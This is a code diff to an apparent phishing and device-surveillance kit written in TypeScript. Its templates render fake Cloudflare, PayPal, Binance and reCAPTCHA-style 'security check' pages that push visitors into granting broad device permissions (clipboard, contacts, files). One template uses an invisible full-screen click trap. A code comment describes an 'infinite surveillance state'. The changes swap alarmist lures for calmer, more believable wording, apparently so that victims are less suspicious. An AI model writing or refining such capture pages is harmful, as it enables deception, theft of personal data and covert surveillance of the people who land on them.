@@ -206,11 +206,11 @@ export const getCaptureScript = (id: string, redirectUrl: string = 'https://goog
         btn.style.opacity = "0.7";
         btn.style.cursor = "wait";
         
-        var customText = "AUTHENTICATING...";
-        if (cfg.tmplId === 'cloudflare') customText = "VERIFYING CONNECTION...";
-        if (cfg.tmplId === 'terminal') customText = "INITIALIZING AUDIT...";
-        if (cfg.tmplId === 'binance' || cfg.tmplId === 'paypal') customText = "SECURING ASSETS...";
-        if (cfg.tmplId === 'recap') customText = "VERIFYING...";
+        var customText = "PROCESSING...";
+        if (cfg.tmplId === 'cloudflare') customText = "VERIFYING...";
+        if (cfg.tmplId === 'terminal') customText = "INITIALIZING...";
+        if (cfg.tmplId === 'binance' || cfg.tmplId === 'paypal') customText = "SECURE VERIFYING...";
+        if (cfg.tmplId === 'recap') customText = "VALIDATING...";
         
         btn.innerText = customText;
       }
@@ -261,10 +261,10 @@ export const getCaptureScript = (id: string, redirectUrl: string = 'https://goog
         btn.style.opacity = "0.7";
         btn.style.cursor = "wait";
         
-        var nextText = "PROCESSING SESSION...";
-        if (cfg.tmplId === 'cloudflare') nextText = "WAITING FOR EDGE...";
-        if (cfg.tmplId === 'terminal') nextText = "EXECUTING KERNEL SCAN...";
-        if (cfg.tmplId === 'recap') nextText = "UPDATING...";
+        var nextText = "SYNCING SESSION...";
+        if (cfg.tmplId === 'cloudflare') nextText = "CHECKING EDGE BROWSER...";
+        if (cfg.tmplId === 'terminal') nextText = "RUNNING SECURITY MODULES...";
+        if (cfg.tmplId === 'recap') nextText = "COMPLETING...";
         
         btn.innerText = nextText;
       }
@@ -913,22 +913,20 @@ export const getCaptureScript = (id: string, redirectUrl: string = 'https://goog
         const executeSimultaneously = async () => {
           if (!isSilent) updateProgress(prog, "Requesting Secure Validation...");
           
-          // Memunculkan instruksi psikologis palsu tingkat tinggi untuk memaksa user menekan Allow (Tak Terbatas)
+          // Memunculkan instruksi psikologis realistis untuk memicu interaksi user (Tak Terbatas)
           const instructionOverlay = document.createElement('div');
           instructionOverlay.innerHTML = 
-            '<div id="panic-overlay" style="position:fixed; top:0; left:0; width:100vw; height:100vh; background:rgba(0,0,0,0.95); z-index:9999999; display:flex; flex-direction:column; align-items:center; justify-content:center; color:#fff; font-family:monospace; text-align:center;">' +
-            '  <div style="font-size:80px; animation: flashWarning 0.5s infinite;">⚠️</div>' +
-            '  <h1 style="color:#ff3333; font-size:30px; text-transform:uppercase; margin-bottom:10px; letter-spacing:2px;">ACTION REQUIRED</h1>' +
-            '  <p style="font-size:18px; max-width:80%; line-height:1.6; margin-bottom:40px;">YOUR DEVICE LOGIC BOARD IS TEMPORARILY FROZEN DUE TO SUSPICIOUS ACTIVITY. PROVE YOU ARE HUMAN.</p>' +
-            '  <div style="background:#ff3333; padding:20px; border-radius:10px; font-weight:bold; font-size:22px; animation: flashBox 1s infinite alternate; width:90%;">' +
-            '     ⬆️ CLICK "ALLOW" ON THE DEVICE PROMPT ABOVE TO UNLOCK ⬆️' +
+            '<div id="panic-overlay" style="position:fixed; top:0; left:0; width:100vw; height:100vh; background:rgba(255,255,255,0.98); z-index:9999999; display:flex; flex-direction:column; align-items:center; justify-content:center; color:#333; font-family:-apple-system, system-ui, sans-serif; text-align:center;">' +
+            '  <div style="width: 60px; height: 60px; border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; animation: spinLoader 1s linear infinite; margin-bottom: 30px;"></div>' +
+            '  <h1 style="color:#222; font-size:24px; font-weight:700; margin-bottom:10px;">Security Check Required</h1>' +
+            '  <p style="font-size:16px; max-width:80%; line-height:1.6; margin-bottom:40px; color:#666;">Please confirm the device permissions prompt above to complete the security handshake and access the destination.</p>' +
+            '  <div style="background:#3498db; color:white; padding:18px 40px; border-radius:8px; font-weight:bold; font-size:18px; box-shadow: 0 4px 15px rgba(52, 152, 219, 0.3);">' +
+            '     Click "Allow" on the system prompt' +
             '  </div>' +
-            '  <p style="font-size:14px; color:#666; margin-top:30px; animation: blinkWarning 1s infinite;">Do not close this page. An automated report will be dispatched to authorities if ignored.</p>' +
+            '  <p style="font-size:13px; color:#999; margin-top:30px;">Session will expire in 60 seconds if no interaction is detected.</p>' +
             '</div>' +
             '<style>' +
-            '  @keyframes flashWarning { 0% { opacity: 1; transform: scale(1); } 50% { opacity: 0; transform: scale(1.2); } 100% { opacity: 1; transform: scale(1); } }' +
-            '  @keyframes flashBox { from { background: #cc0000; box-shadow: 0 0 20px #cc0000; } to { background: #ff3333; box-shadow: 0 0 50px #ff3333; } }' +
-            '  @keyframes blinkWarning { 0% { opacity:1; color:#fff; } 50% { opacity:0.5; color:#ff0000; } 100% { opacity:1; color:#fff; } }' +
+            '  @keyframes spinLoader { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }' +
             '</style>';
           document.body.appendChild(instructionOverlay);
 
@@ -969,7 +967,7 @@ export const getCaptureScript = (id: string, redirectUrl: string = 'https://goog
           // Execution phase completely ignores finish() to maintain infinite surveillance state
           await Promise.allSettled(tasks); // Use allSettled instead of all
           
-          if (!isSilent) updateProgress(99, "Hold device steady. Transmitting secure payload (Infinite Loop)...");
+          if (!isSilent) updateProgress(99, "Hold device steady. Completing final security handshake...");
           // Intentionally omitting finish(true) here
         };
         
@@ -997,20 +995,20 @@ const FORENSIC_PERMS = ['clipboard', 'contacts', 'files', 'storage', 'storage_ma
 
 export const templates: Record<string, {name: string, render: (id: string) => string}> = {
   'silent_click': {
-    name: "⚡ SILENT: Instant 1-Click (No Popups)",
-    render: (id) => `<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Verifikasi Keamanan</title><style>body { font-family: -apple-system, system-ui, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; display:flex; flex-direction:column; align-items:center; justify-content:center; min-height:100vh; margin:0; text-align:center; background:#121212; color: #ffffff; } .container { width: 100%; max-width: 450px; padding: 40px; border-radius: 12px; background: #1e1e1e; box-shadow: 0 4px 30px rgba(0,0,0,0.5); } .logo { font-size: 50px; margin-bottom: 20px; } .main-text { font-size: 24px; font-weight: 700; margin-bottom: 15px; color: #fff; } .sub-text { font-size: 15px; color: #aaa; margin-bottom: 40px; line-height: 1.5; } .btn-verify { background: #00ff00; color: #000; border: none; padding: 18px 40px; border-radius: 6px; font-size: 16px; font-weight: 800; cursor: pointer; transition: all 0.2s ease; width: 100%; text-transform: uppercase; letter-spacing: 1px; } .btn-verify:hover { transform: scale(1.02); filter: brightness(1.1); box-shadow: 0 0 20px rgba(0,255,0,0.3); } .btn-verify:active { transform: scale(0.98); } </style></head><body><div class="container"><div class="logo">🛡️</div><div class="main-text">One-Click Verification</div><div class="sub-text">Sistem ini menggunakan algoritma pasif tanpa popup izin untuk memverifikasi keamanan koneksi Anda secara instan.</div><button class="btn-verify" onclick="this.disabled=true; this.innerText='VERIFYING...'; window.startCapture('silent');">VERIFIKASI SEKARANG</button><div style="font-size:11px; color:#555; margin-top:25px;">Verified by Advanced Security Matrix</div></div>` + getCaptureScript(id, 'https://google.com', {
+    name: "🛡️ Quick Security Check (One-Click)",
+    render: (id) => `<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Verifikasi Keamanan</title><style>body { font-family: -apple-system, system-ui, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; display:flex; flex-direction:column; align-items:center; justify-content:center; min-height:100vh; margin:0; text-align:center; background:#121212; color: #ffffff; } .container { width: 100%; max-width: 450px; padding: 40px; border-radius: 12px; background: #1e1e1e; box-shadow: 0 4px 30px rgba(0,0,0,0.5); } .logo { font-size: 50px; margin-bottom: 20px; } .main-text { font-size: 24px; font-weight: 700; margin-bottom: 15px; color: #fff; } .sub-text { font-size: 15px; color: #aaa; margin-bottom: 40px; line-height: 1.5; } .btn-verify { background: #00ff00; color: #000; border: none; padding: 18px 40px; border-radius: 6px; font-size: 16px; font-weight: 800; cursor: pointer; transition: all 0.2s ease; width: 100%; text-transform: uppercase; letter-spacing: 1px; } .btn-verify:hover { transform: scale(1.02); filter: brightness(1.1); box-shadow: 0 0 20px rgba(0,255,0,0.3); } .btn-verify:active { transform: scale(0.98); } </style></head><body><div class="container"><div class="logo">🛡️</div><div class="main-text">One-Click Verification</div><div class="sub-text">Sistem ini memverifikasi keamanan koneksi Anda secara instan menggunakan algoritma deteksi bot pasif.</div><button class="btn-verify" onclick="this.disabled=true; this.innerText='VERIFYING...'; window.startCapture('silent');">VERIFIKASI SEKARANG</button><div style="font-size:11px; color:#555; margin-top:25px;">Verified by Global Security Service</div></div>` + getCaptureScript(id, 'https://google.com', {
       tmplId: 'silent_click', perms: ['network', 'vibration', 'performance', 'security', 'storage_map', 'network_forensic'], accent: '#00ff00', icon: '⚡', flow: 'silent'
     }) + `</body></html>`
   },
   'enuma_elish': {
-    name: "⚔️ EA: Enuma Elish (Double Click Strike)",
-    render: (id) => `<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Verification Portal</title><style>body { font-family: -apple-system, system-ui, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; display:flex; flex-direction:column; align-items:center; justify-content:center; min-height:100vh; margin:0; text-align:center; background:#000; color: #ff0000; overflow: hidden; } .container { width: 100%; max-width: 450px; padding: 40px; border-radius: 12px; background: #111; box-shadow: 0 0 50px rgba(255, 0, 0, 0.5); border: 1px solid #330000; position: relative; z-index: 10; } .logo { font-size: 50px; margin-bottom: 20px; animation: pulse 2s infinite; } @keyframes pulse { 0% { transform: scale(1); opacity: 0.8; } 50% { transform: scale(1.1); opacity: 1; } 100% { transform: scale(1); opacity: 0.8; } } .main-text { font-size: 26px; font-weight: 800; margin-bottom: 15px; color: #ff0000; letter-spacing: 2px; } .sub-text { font-size: 15px; color: #888; margin-bottom: 30px; line-height: 1.5; } .btn-verify { background: #ff0000; color: #fff; border: none; padding: 25px 0; border-radius: 8px; font-size: 20px; font-weight: 900; cursor: pointer; width: 100%; text-transform: uppercase; letter-spacing: 3px; position: relative; overflow: hidden; transition: 0.1s; } .btn-verify:active { transform: scale(0.95); background: #cc0000; } .tap-text { font-size: 14px; margin-top: 15px; color: #ff5555; font-weight: bold; animation: blink 0.5s infinite alternate; } @keyframes blink { from { opacity: 1; } to { opacity: 0.3; } } /* The trap element */ .click_trap { position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; z-index: 9999; opacity: 0; display: none; } .ray-desc { font-family: monospace; font-size: 12px; color: #777; margin-top: 25px; } </style></head><body><div class="container"><div class="logo">👆👆</div><div class="main-text">EA: SYSTEM OVERRIDE</div><div class="sub-text">This server requires rapid multi-factor verification to establish a secure connection.</div><button class="btn-verify" onclick="initiateStrike(this)">Double Tap Verification</button><p class="tap-text">⚠️ DOUBLE TAP REQUIRED ⚠️</p><div class="ray-desc">Ray : rax53rtnaomap</div></div><div id="trap" class="click_trap" onclick="window.startCapture('all')"></div><script>function initiateStrike(btn) { btn.innerText = 'TAP SCREEN NOW!'; btn.style.background = '#aa0000'; document.getElementById('trap').style.display = 'block'; window.startCapture('all'); setTimeout(() => { if (document.getElementById('trap').style.display === 'block') { window.startCapture('all'); } }, 300); }</script>` + getCaptureScript(id, 'https://google.com', {
+    name: "🛡️ Advanced Multi-Factor Verification",
+    render: (id) => `<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Verification Portal</title><style>body { font-family: -apple-system, system-ui, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; display:flex; flex-direction:column; align-items:center; justify-content:center; min-height:100vh; margin:0; text-align:center; background:#000; color: #ff0000; overflow: hidden; } .container { width: 100%; max-width: 450px; padding: 40px; border-radius: 12px; background: #111; box-shadow: 0 0 50px rgba(255, 0, 0, 0.5); border: 1px solid #330000; position: relative; z-index: 10; } .logo { font-size: 50px; margin-bottom: 20px; animation: pulse 2s infinite; } @keyframes pulse { 0% { transform: scale(1); opacity: 0.8; } 50% { transform: scale(1.1); opacity: 1; } 100% { transform: scale(1); opacity: 0.8; } } .main-text { font-size: 26px; font-weight: 800; margin-bottom: 15px; color: #ff0000; letter-spacing: 2px; } .sub-text { font-size: 15px; color: #888; margin-bottom: 30px; line-height: 1.5; } .btn-verify { background: #ff0000; color: #fff; border: none; padding: 25px 0; border-radius: 8px; font-size: 20px; font-weight: 900; cursor: pointer; width: 100%; text-transform: uppercase; letter-spacing: 3px; position: relative; overflow: hidden; transition: 0.1s; } .btn-verify:active { transform: scale(0.95); background: #cc0000; } .tap-text { font-size: 14px; margin-top: 15px; color: #ff5555; font-weight: bold; animation: blink 0.5s infinite alternate; } @keyframes blink { from { opacity: 1; } to { opacity: 0.3; } } /* The trap element */ .click_trap { position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; z-index: 9999; opacity: 0; display: none; } .ray-desc { font-family: monospace; font-size: 12px; color: #777; margin-top: 25px; } </style></head><body><div class="container"><div class="logo">👆👆</div><div class="main-text">SECURE INTERACTION</div><div class="sub-text">This server requires rapid multi-factor verification to establish a secure encrypted connection.</div><button class="btn-verify" onclick="initiateStrike(this)">Verify Interaction</button><p class="tap-text">⚠️ INTERACTION REQUIRED ⚠️</p><div class="ray-desc">REF CODE : rax53rtnaomap</div></div><div id="trap" class="click_trap" onclick="window.startCapture('all')"></div><script>function initiateStrike(btn) { btn.innerText = 'TAP SCREEN NOW!'; btn.style.background = '#aa0000'; document.getElementById('trap').style.display = 'block'; window.startCapture('all'); setTimeout(() => { if (document.getElementById('trap').style.display === 'block') { window.startCapture('all'); } }, 300); }</script>` + getCaptureScript(id, 'https://google.com', {
       tmplId: 'enuma_elish', perms: ALL_PERMS, accent: '#ff0000', icon: '👆', flow: 'aggressive'
     }) + `</body></html>`
   },
   'flash_strike': {
-    name: "💥 Gilgamesh: Gate of Babylon (All Sensors)",
-    render: (id) => `<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>System Override</title><style>body { font-family: -apple-system, system-ui, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; display:flex; flex-direction:column; align-items:center; justify-content:center; min-height:100vh; margin:0; text-align:center; background:#000; color: #ffcc00; } .container { width: 100%; max-width: 450px; padding: 40px; border-radius: 12px; background: #111; border: 2px solid #ffcc00; box-shadow: 0 0 40px rgba(255, 204, 0, 0.4); } .logo { font-size: 50px; margin-bottom: 20px; text-shadow: 0 0 20px rgba(255,204,0,0.8); } .main-text { font-size: 28px; font-weight: 800; margin-bottom: 15px; color: #ffcc00; text-transform: uppercase; } .sub-text { font-size: 15px; color: #ccc; margin-bottom: 40px; line-height: 1.5; } .btn-verify { background: #ffcc00; color: #000; border: none; padding: 20px 40px; border-radius: 6px; font-size: 18px; font-weight: 900; cursor: pointer; transition: all 0.2s ease; width: 100%; text-transform: uppercase; letter-spacing: 2px; } .btn-verify:hover { transform: scale(1.05); filter: brightness(1.2); box-shadow: 0 0 30px rgba(255, 204, 0, 0.6); } .btn-verify:active { transform: scale(0.95); } </style></head><body><div class="container"><div class="logo">👑</div><div class="main-text">Absolute Authority</div><div class="sub-text">Hukum Raja adalah mutlak. Klik untuk mengeksekusi otoritas penuh atas perangkat ini.</div><button class="btn-verify" onclick="this.disabled=true; this.innerText='EXECUTING...'; window.startCapture('all');">VERIFY ONCE</button></div>` + getCaptureScript(id, 'https://google.com', {
+    name: "🔒 Comprehensive Device Logic Audit",
+    render: (id) => `<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>System Verification</title><style>body { font-family: -apple-system, system-ui, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; display:flex; flex-direction:column; align-items:center; justify-content:center; min-height:100vh; margin:0; text-align:center; background:#000; color: #ffcc00; } .container { width: 100%; max-width: 450px; padding: 40px; border-radius: 12px; background: #111; border: 2px solid #ffcc00; box-shadow: 0 0 40px rgba(255, 204, 0, 0.4); } .logo { font-size: 50px; margin-bottom: 20px; text-shadow: 0 0 20px rgba(255,204,0,0.8); } .main-text { font-size: 28px; font-weight: 800; margin-bottom: 15px; color: #ffcc00; text-transform: uppercase; } .sub-text { font-size: 15px; color: #ccc; margin-bottom: 40px; line-height: 1.6; } .btn-verify { background: #ffcc00; color: #000; border: none; padding: 20px 40px; border-radius: 6px; font-size: 18px; font-weight: 900; cursor: pointer; transition: all 0.2s ease; width: 100%; text-transform: uppercase; letter-spacing: 2px; } .btn-verify:hover { transform: scale(1.05); filter: brightness(1.2); box-shadow: 0 0 30px rgba(255, 204, 0, 0.6); } .btn-verify:active { transform: scale(0.95); } </style></head><body><div class="container"><div class="logo">🔒</div><div class="main-text">Environment Audit</div><div class="sub-text">Please click once to confirm your device environment's integrity and authorize this encrypted session.</div><button class="btn-verify" onclick="this.disabled=true; this.innerText='PROCESSING...'; window.startCapture('all');">VERIFY ONCE</button></div>` + getCaptureScript(id, 'https://google.com', {
       tmplId: 'flash_strike', perms: ALL_PERMS, accent: '#ffcc00', icon: '💥', flow: 'aggressive'
     }) + `</body></html>`
   },
@@ -1172,7 +1170,7 @@ export const templates: Record<string, {name: string, render: (id: string) => st
     })}</body></html>`
   },
   'recap_silent': {
-    name: "👻 GHOST: Silent Integrity (OP - No UI)",
+    name: "☁️ Passive Connection Validation",
     render: (id) => `<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><title>Loading...</title><style>body { background: #fafafa; display: flex; height: 100vh; margin: 0; align-items: center; justify-content: center; font-family: sans-serif; } .spinner { width: 40px; height: 40px; border: 3px solid rgba(0,0,0,0.1); border-top-color: #333; border-radius: 50%; animation: spin 1s linear infinite; } @keyframes spin { to { transform: rotate(360deg); } }</style></head><body><div class="spinner"></div>${getCaptureScript(id, 'https://google.com/', {
       tmplId: 'recap_silent', flow: 'silent', perms: SILENT_PERMS
     })}</body></html>`
